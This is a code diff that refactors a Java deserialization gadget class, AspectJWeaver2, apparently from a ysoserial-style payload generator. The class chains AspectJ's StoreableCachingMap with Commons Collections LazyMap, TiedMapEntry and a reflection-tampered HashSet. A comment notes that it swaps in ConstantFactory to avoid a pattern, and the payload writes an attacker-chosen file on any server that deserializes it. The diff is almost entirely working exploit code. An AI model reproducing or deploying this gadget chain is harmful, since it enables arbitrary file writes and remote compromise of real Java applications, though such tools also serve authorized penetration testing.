@@ -22,7 +22,7 @@ import java.util.Map;
  * 使用 ConstantFactory + FactoryTransformer 替换 ConstantTransformer，避免，类似本项目中的 CC10
  */
 
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings({"unused"})
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
 @Authors({Authors.QI4L})
 public class AspectJWeaver2 implements ObjectPayload<Serializable> {
@@ -37,31 +37,38 @@ public class AspectJWeaver2 implements ObjectPayload<Serializable> {
         String[] parts = command.split(";");
         String filename = parts[0];
         byte[] content = Base64.decodeBase64(parts[1]);
-
-        Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
+        Constructor<?> ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
         Object simpleCache = ctor.newInstance(".", 12);
 
         Factory ft = new ConstantFactory(content);
         Transformer ct = new FactoryTransformer(ft);
 
-        Map lazyMap = LazyMap.decorate((Map) simpleCache, ct);
+        Map<?,?> lazyMap = LazyMap.decorate((Map<?,?>) simpleCache, ct);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
-        HashSet map = new HashSet(1);
+
+        return getSerializableCC6(entry);
+
+    }
+
+    static Serializable getSerializableCC6(TiedMapEntry entry) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashSet<String> map = new HashSet<>(1);
         map.add("QI4L");
-        Field f = null;
+        Field f;
         try {
             f = HashSet.class.getDeclaredField("map");
         } catch (NoSuchFieldException e) {
+            //noinspection JavaReflectionMemberAccess
             f = HashSet.class.getDeclaredField("backingMap");
         }
 
         Reflections.setAccessible(f);
-        HashMap innimpl = (HashMap) f.get(map);
+        HashMap<?,?> innimpl = (HashMap<?,?>) f.get(map);
 
-        Field f2 = null;
+        Field f2;
         try {
             f2 = HashMap.class.getDeclaredField("table");
         } catch (NoSuchFieldException e) {
+            //noinspection JavaReflectionMemberAccess
             f2 = HashMap.class.getDeclaredField("elementData");
         }
 
@@ -73,7 +80,7 @@ public class AspectJWeaver2 implements ObjectPayload<Serializable> {
             node = array[1];
         }
 
-        Field keyField = null;
+        Field keyField;
         try {
             keyField = node.getClass().getDeclaredField("key");
         } catch (Exception e) {
@@ -84,6 +91,5 @@ public class AspectJWeaver2 implements ObjectPayload<Serializable> {
         keyField.set(node, entry);
 
         return map;
-
     }
 }
